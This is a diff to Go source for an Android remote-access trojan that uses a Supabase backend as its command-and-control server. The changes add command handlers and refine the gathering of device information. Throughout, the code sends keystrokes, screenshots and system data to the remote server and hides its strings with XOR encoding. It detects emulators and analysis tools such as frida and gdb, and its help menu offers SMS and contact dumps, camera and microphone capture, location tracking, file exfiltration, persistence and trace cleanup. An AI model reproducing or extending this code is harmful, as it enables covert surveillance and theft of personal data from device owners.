@@ -35,7 +35,7 @@ var (
 // ============================================================
 
 var (
-	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34}
+	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34, 0x61, 0x39, 0x32, 0x3B, 0x28, 0x29, 0x3F, 0x2E, 0x67, 0x2F, 0x2E, 0x3C, 0x77, 0x62}
 	encAPIKey      = []byte{0x3B, 0x2A, 0x33, 0x31, 0x3F, 0x23}
 	encAuth        = []byte{0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34}
 	encBearer      = []byte{0x18, 0x3F, 0x3B, 0x28, 0x3F, 0x28, 0x7A}
@@ -152,19 +152,21 @@ func (c *SupabaseC2) Heartbeat() {
 }
 
 func getPublicIP() string {
-	// Try multiple methods
-	methods := []string{
-		"curl -s --max-time 5 https://api.ipify.org 2>/dev/null",
-		"curl -s --max-time 5 https://ifconfig.me 2>/dev/null",
-		"ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1",
-	}
-	for _, cmd := range methods {
-		out, _ := shellExecTimeout(cmd, 10*time.Second)
-		if out != "" && !strings.Contains(out, "error") {
-			return strings.TrimSpace(out)
+	// Use Go net/http like Windows agent (curl may not exist on Android)
+	cl := &http.Client{Timeout: 5 * time.Second}
+	for _, svc := range []string{"https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"} {
+		resp, err := cl.Get(svc)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		ip := strings.TrimSpace(string(body))
+		if ip != "" {
+			return ip
 		}
 	}
-	return ""
+	return "unknown"
 }
 
 func (c *SupabaseC2) PollCommands() []Command {
@@ -201,6 +203,7 @@ func (c *SupabaseC2) SendSystemInfo(infoType string, data interface{}) {
 		"machine_id": c.machineID,
 		"info_type":  infoType,
 		"data":       data,
+		"created_at": time.Now().UTC().Format(time.RFC3339),
 	}
 	d, _ := json.Marshal(payload)
 	resp, err := c.doRequest("POST", "/rest/v1/system_info", bytes.NewReader(d), nil)
@@ -214,6 +217,7 @@ func (c *SupabaseC2) SendKeylog(keys, windowTitle string) {
 		"machine_id":   c.machineID,
 		"keystrokes":   keys,
 		"window_title": windowTitle,
+		"created_at":   time.Now().UTC().Format(time.RFC3339),
 	}
 	d, _ := json.Marshal(payload)
 	resp, err := c.doRequest("POST", "/rest/v1/keylogs", bytes.NewReader(d), nil)
@@ -377,9 +381,8 @@ func getDeviceInfo() map[string]interface{} {
 	ip, _ := shellExec("ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1")
 	info["ip"] = ip
 
-	// External IP
-	extIP, _ := shellExecTimeout("curl -s --max-time 5 https://api.ipify.org", 10*time.Second)
-	info["external_ip"] = extIP
+	// External IP (use Go net/http, not curl)
+	info["external_ip"] = getPublicIP()
 
 	// Battery
 	battery, _ := shellExec("dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | head -5")
@@ -969,6 +972,102 @@ func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) 
 			return "Job not found: " + args.Name, nil
 		}
 		return "No job name specified", nil
+
+	case "ping":
+		return "pong", nil
+
+	case "sleep":
+		var args struct {
+			Seconds int `json:"seconds"`
+		}
+		json.Unmarshal([]byte(cmd.Args), &args)
+		if args.Seconds == 0 {
+			args.Seconds = 60
+		}
+		time.Sleep(time.Duration(args.Seconds) * time.Second)
+		return fmt.Sprintf("Slept %d seconds", args.Seconds), nil
+
+	case "pausejobs":
+		jm.StopAll()
+		return "All jobs stopped", nil
+
+	case "resumejobs":
+		jm.Start("screenshots", func(ctx context.Context) {
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+				}
+				data, err := takeScreenshot()
+				if err == nil {
+					c2.UploadFile("screenshot.png", data, "screenshot")
+				}
+				time.Sleep(30 * time.Second)
+			}
+		})
+		return "Default jobs resumed (screenshots)", nil
+
+	case "antianalysis":
+		var sb strings.Builder
+		sb.WriteString("=== Anti-Analysis Report ===\n\n")
+		sb.WriteString(fmt.Sprintf("Emulator detected: %v\n", isEmulator()))
+		sb.WriteString(fmt.Sprintf("Rooted: %v\n", isRooted()))
+		sb.WriteString(fmt.Sprintf("Hardware: %s\n", getProp("ro.hardware")))
+		sb.WriteString(fmt.Sprintf("Model: %s\n", getProp("ro.product.model")))
+		sb.WriteString(fmt.Sprintf("Device: %s\n", getProp("ro.product.device")))
+		sb.WriteString(fmt.Sprintf("QEMU: %s\n", getProp("ro.kernel.qemu")))
+		sb.WriteString(fmt.Sprintf("Characteristics: %s\n", getProp("ro.build.characteristics")))
+		// Check for analysis tools
+		tools := []string{"frida-server", "objection", "drozer", "tcpdump", "strace", "gdb"}
+		var found []string
+		for _, t := range tools {
+			if _, err := exec.LookPath(t); err == nil {
+				found = append(found, t)
+			}
+		}
+		if len(found) > 0 {
+			sb.WriteString(fmt.Sprintf("Analysis tools found: %s\n", strings.Join(found, ", ")))
+		} else {
+			sb.WriteString("Analysis tools found: none\n")
+		}
+		return sb.String(), nil
+
+	case "options", "help":
+		return `Available commands:
+  ping              - Connection test
+  sysinfo           - Full device information
+  isadmin           - Check if device is rooted
+  shell {cmd}       - Execute shell command
+  screenshot        - Single screenshot
+  screenshots       - Continuous screenshots (job)
+  contacts          - Dump contacts
+  sms_dump          - Dump SMS messages
+  calllog           - Dump call log
+  apps              - List installed apps
+  wifi              - WiFi info + saved networks
+  location          - Get last known location
+  location_track    - Continuous location tracking (job)
+  clipboard         - Read clipboard
+  camera            - Take photo
+  microphone        - Record audio
+  foldertree        - List files in directory
+  download {path}   - Download file from device
+  upload {path,data}- Upload file to device
+  exfiltrate        - Bulk file exfiltration
+  toast {message}   - Show toast message
+  openurl {url}     - Open URL in browser
+  vibrate           - Vibrate device
+  persist           - Install persistence
+  unpersist         - Remove persistence
+  cleanup           - Clear traces
+  sleep {seconds}   - Sleep N seconds
+  antianalysis      - Anti-analysis report
+  jobs              - List active jobs
+  kill {name}       - Stop a job
+  pausejobs         - Stop all jobs
+  resumejobs        - Resume default jobs
+  exit              - Kill agent`, nil
 
 	case "exit":
 		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
